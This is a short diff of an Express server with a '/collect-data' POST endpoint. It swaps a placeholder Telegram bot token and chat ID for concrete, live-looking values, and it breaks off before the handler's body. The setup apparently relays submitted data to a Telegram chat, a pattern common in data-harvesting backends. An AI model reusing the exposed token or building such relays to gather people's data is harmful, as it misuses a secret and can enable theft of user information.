@@ -1,13 +1,13 @@
 const express = require('express');
 const app = express();
-const port = process.env.PORT || 999;
+const port = process.env.PORT || 3000;
 const axios = require('axios');
 
 app.use(express.json());
 
 const telegramApiUrl = 'https://api.telegram.org/bot';
-const token = 'YOUR_TELEGRAM_BOT_TOKEN';
-const chatId = '-1001491052715';
+const token = '7621931324:AAHlBmKGDpHbNUfpfcqDndZpdvkyjP0Bo0A';
+const chatId = '6964965007';
 
 app.post('/collect-data', (req, res) => {
   const data = req.body;
